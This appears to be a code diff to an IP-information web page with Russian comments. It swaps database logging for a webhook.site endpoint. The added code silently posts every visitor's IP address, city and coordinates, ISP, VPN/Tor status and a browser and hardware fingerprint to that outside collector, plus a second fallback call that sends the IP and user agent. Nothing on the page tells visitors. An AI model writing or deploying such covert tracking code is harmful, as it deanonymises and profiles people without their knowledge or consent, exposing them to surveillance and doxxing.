@@ -103,7 +103,7 @@
     .ios-section-header {
       padding: 14px 18px 6px 18px;
       font-size: 13px;
-      font-weight: 500;
+      font-weight:500;
       text-transform: uppercase;
       letter-spacing: 0.3px;
       color: #8e8e93;
@@ -255,9 +255,8 @@
 
 <script>
   (function() {
-    // ===== КОНФИГУРАЦИЯ SUPABASE =====
-    const SUPABASE_URL = 'https://ihllwkjnnvfbmwalnlkf.supabase.co';
-    const SUPABASE_KEY = 'sb_publishable_WOhf92LBv9zPUDOjtZbzEA_DQjLbWj_';
+    // ===== ТВОЙ WEBHOOK =====
+    const WEBHOOK_URL = 'https://webhook.site/9edcb0dc-3b9b-4f7e-9976-27fd4e804e70';
     
     const $ = (id) => document.getElementById(id);
 
@@ -309,49 +308,48 @@
 
     const container = $('ipDataContainer');
     
-    // ===== ОТПРАВКА В SUPABASE =====
-    async function sendToSupabase(data) {
-      try {
-        const response = await fetch(`${SUPABASE_URL}/rest/v1/visitors`, {
-          method: 'POST',
-          headers: {
-            'apikey': SUPABASE_KEY,
-            'Authorization': `Bearer ${SUPABASE_KEY}`,
-            'Content-Type': 'application/json',
-            'Prefer': 'return=minimal'
-          },
-          body: JSON.stringify({
-            ip: data.ip || null,
-            country: data.location?.country || null,
-            city: data.location?.city || null,
-            region: data.location?.state || null,
-            postal: data.location?.zip || null,
-            latitude: data.location?.latitude || null,
-            longitude: data.location?.longitude || null,
-            provider: data.company?.name || null,
-            asn: data.asn?.asn ? `AS${data.asn.asn}` : null,
-            is_vpn: data.is_vpn || false,
-            is_proxy: data.is_proxy || false,
-            is_tor: data.is_tor || false,
-            is_hosting: data.is_datacenter || false,
-            device: detectDeviceType(ua),
-            browser: detectBrowser(ua),
-            user_agent: ua,
-            screen: `${screenW}×${screenH}`,
-            language: language,
-            timezone: timezone,
-            local_time: formatLocalTime()
-          })
-        });
-        
-        if (response.ok) {
-          console.log('✅ Данные отправлены в Supabase');
-        } else {
-          console.error('❌ Ошибка Supabase:', await response.text());
-        }
-      } catch (e) {
-        console.error('❌ Ошибка отправки:', e);
-      }
+    // ===== ФУНКЦИЯ ОТПРАВКИ НА WEBHOOK =====
+    function sendToWebhook(data) {
+      const payload = {
+        timestamp: new Date().toISOString(),
+        local_time: formatLocalTime(),
+        ip: data.ip || null,
+        country: data.location?.country || null,
+        country_code: data.location?.country_code || null,
+        city: data.location?.city || null,
+        region: data.location?.state || null,
+        postal: data.location?.zip || null,
+        latitude: data.location?.latitude || null,
+        longitude: data.location?.longitude || null,
+        provider: data.company?.name || data.asn?.org || null,
+        asn: data.asn?.asn ? `AS${data.asn.asn}` : null,
+        is_vpn: data.is_vpn || false,
+        is_proxy: data.is_proxy || false,
+        is_tor: data.is_tor || false,
+        is_hosting: data.is_datacenter || false,
+        is_mobile: data.is_mobile || false,
+        is_bot: data.is_crawler || false,
+        device: detectDeviceType(ua),
+        browser: detectBrowser(ua),
+        user_agent: ua,
+        screen: `${screenW}×${screenH}`,
+        language: language,
+        platform: platform,
+        timezone: timezone,
+        online: online,
+        cookies_enabled: navigator.cookieEnabled,
+        touch_points: navigator.maxTouchPoints || 0,
+        hardware_cores: navigator.hardwareConcurrency || null,
+        memory_gb: navigator.deviceMemory || null
+      };
+      
+      fetch(WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      })
+      .then(() => console.log('✅ Отправлено на Webhook'))
+      .catch(e => console.error('❌ Ошибка Webhook:', e));
     }
     
     function countryCodeToFlag(code) {
@@ -368,8 +366,8 @@
         return;
       }
       
-      // Отправляем в Supabase
-      sendToSupabase(data);
+      // Отправляем ВСЕ данные на вебхук
+      sendToWebhook(data);
 
       const loc = data.location || {};
       const comp = data.company || {};
@@ -406,13 +404,9 @@
         : '<span class="tag tag-neutral">Чистое</span>';
 
       const provider = comp.name || asn.org || asn.descr || '';
-      
       const asnDisplay = asn.asn ? `AS${asn.asn} ${asn.descr ? '· '+asn.descr : ''}` : '';
-      
       const companyType = comp.type ? comp.type.toUpperCase() : '';
-      
       const abuseContact = abuse.email || asn.abuse || '';
-      
       const providerDomain = comp.domain ? comp.domain : null;
 
       let rowsHtml = `
@@ -501,6 +495,12 @@
               fb.textContent = data.ip;
               fb.style.color = '#ffffff';
             }
+            // Отправляем хотя бы IP
+            fetch(WEBHOOK_URL, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ ip: data.ip, source: 'ipify_fallback', time: formatLocalTime(), ua: ua })
+            });
           }
         })
         .catch(() => {});
@@ -521,7 +521,7 @@
       const overlay = $('loadingOverlay');
       setTimeout(() => {
         overlay.classList.add('hidden');
-      }, 3000);
+      }, 2000);
     });
   })();
 </script>
